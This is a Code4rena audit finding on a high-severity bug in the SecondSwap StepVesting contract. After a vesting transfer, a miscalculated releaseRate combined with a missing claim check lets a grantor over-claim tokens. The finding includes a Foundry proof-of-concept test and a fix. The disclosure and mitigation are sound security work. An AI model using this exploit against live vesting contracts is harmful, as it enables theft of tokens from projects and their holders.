*Platform: Code4arena*

Status: Confirmed

Severity: High

### Title: Incorrect `releaseRate` updated value in `SecondSwap_StepVesting::transferVesting` function allows users to over-claiming of tokens

## Description: The transferVesting function in the contract allows privileged addresses to transfer a portion of a vesting schedule from one address (grantor) to another (beneficiary). 
The current logic implementation introduces a critical flaw in how the releaseRate for the grantor is recalculated after the transfer.

```solidity
grantorVesting.releaseRate = grantorVesting.totalAmount / numOfSteps;
```

Specifically, the updated releaseRate is calculated based on the updated total vesting amount and the noOfSteps. However, this calculation does not consider the tokens 
and the number of steps already claimed by the grantor before the transfer. As a result, the recalculated releaseRate becomes overestimated, allowing the grantor to 
claim more tokens than they should be entitled to.

Moreover, the claim function lacks a vital safety check to ensure that the claimableAmount do not exceed the available tokens for a vesting schedule.

```solidity
vesting.amountClaimed += claimableAmount;
token.safeTransfer(msg.sender, claimableAmount);
```

This missing check enables users to exploit the incorrect releaseRate and withdraw tokens beyond their rightful allocation. The absence of this validation makes
the contract vulnerable to abuse by malicious actors. This exploit becomes significantly more severe when the malicious actor controls both the grantor and the beneficiary, 
as it allows them to effectively generate 'free tokens'.

## Proof Of Concept:
To run the PoC, follow these steps:

1. Create a new file in the test/ folder and paste the provided code into it.
2. To execute the test, run the following command: `forge test --mt testTransferVestingReleaseRateIssue`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../contracts/SecondSwap_StepVesting.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("TestToken", "SSTK") {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract SecondSwap_StepVestingTest is Test {
    SecondSwap_StepVesting vesting;
    MockERC20 token;
    address tokenIssuer = address(uint160(uint256(keccak256("tokenIssuer"))));
    address manager = address(uint160(uint256(keccak256("manager"))));
    address vestingDeployer = address(uint160(uint256(keccak256("vestingDeployer"))));

    address user1 = address(uint160(uint256(keccak256("user1"))));
    address user2 = address(uint160(uint256(keccak256("user2"))));

    uint256 startTime;
    uint256 endTime;
    uint256 numOfSteps = 20;

    function setUp() public {

        token = new MockERC20();
        startTime = block.timestamp + 1;
        endTime = startTime + 1000; 

        vesting = new SecondSwap_StepVesting(
            tokenIssuer,
            manager,
            IERC20(address(token)),
            startTime,
            endTime,
            numOfSteps,
            vestingDeployer
        );

        token.mint(tokenIssuer, 1_000_000 ether);
        vm.prank(tokenIssuer);
        token.approve(address(vesting), type(uint256).max);

        // Create vesting for user1
        vm.prank(manager);
        vesting.createVesting(user1, 1000 ether);
    }

    function testTransferVestingReleaseRateIssue() public {
        vm.warp(startTime);

        vm.warp(startTime + 400); // 8 steps passed
        vm.prank(user1);
        vesting.claim();

        uint256 user1Balance = token.balanceOf(user1);
        assertEq(user1Balance, 400 ether, "User1 should have claimed 400 tokens");
        
        
        //transfer 500 to user2 out of remaining 600 tokens
        vm.prank(manager);
        vesting.transferVesting(user1, user2, 500 ether);

        vm.warp(startTime + 950); //19 steps completed
        vm.prank(user1);
        vesting.claim();

        uint256 totalClaimedByUser1 = token.balanceOf(user1);
        emit log_named_uint("Balance of user1:", totalClaimedByUser1);

        uint256 extraToken = totalClaimedByUser1 - 500 ether; //500 tokens transferred to user2
        emit log_named_uint("Extra tokens claimed by user1 :", extraToken);
        
    }
}
```

## Recommended Mitigation Steps:
The releaseRate should be recalculated based on the updated state of the vesting after a transfer. Additionally, a check should be added to the claim function to 
ensure that users cannot claim more tokens than they are entitled to.

```diff
function claim() external {
        (uint256 claimableAmount, uint256 claimableSteps) = claimable(msg.sender);
        require(claimableAmount > 0, "SS_StepVesting: nothing to claim");
+       require(claimableAmount <= available(msg.sender), "SS_StepVesting: Amount claimed cannot be greater than available tokens");
```

